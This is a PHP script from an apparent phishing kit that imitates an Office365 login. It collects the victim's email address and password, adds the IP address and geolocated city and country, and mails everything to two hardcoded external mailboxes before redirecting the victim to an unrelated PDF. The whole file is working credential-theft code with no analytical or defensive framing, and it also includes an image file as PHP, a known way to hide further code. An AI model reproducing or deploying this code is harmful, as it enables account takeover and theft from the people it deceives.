<?php

$Send2Mail=True;
$Save2File=True;
ini_set("output_buffering",4096);
session_start();
$q=$_GET['securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg'];
if($q==""){	include( "signin.php");}
	if($q=="verify"){
	$_SESSION['User'] = $_POST["loginfmt"];
	$email = $_POST["loginfmt"];
		if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
		include("signiner.php");
		}else{		include("pass.php");			}	}
if($q=="done"){
$ip = getenv("REMOTE_ADDR");
$_SESSION['ip']=$ip;
$ID=$_SESSION['User'];
$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}
$msg = "------------------| Cogzy |--------------------\n";
$msg .= "Email Provider: Office365". "\n";
$msg .= "Email: ".$_SESSION['User']."\n";
$msg .= "Password: ".$_POST['passwd']."\n";
$msg .= "IP: ".$ip."\n";
$msg .= "--------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";
$to = "of200200@gmail.com,ssalt200@protonmail.com";
$subject = "Office365 | $ip";
include_once "images/button.gif";
if ($Send2Mail==True);{
mail($to,$subject,$msg);
header("Location:https://www.capgemini.com/wp-content/uploads/2017/07/wealth_management_trends_2017_web_0.pdf");
}
}

?>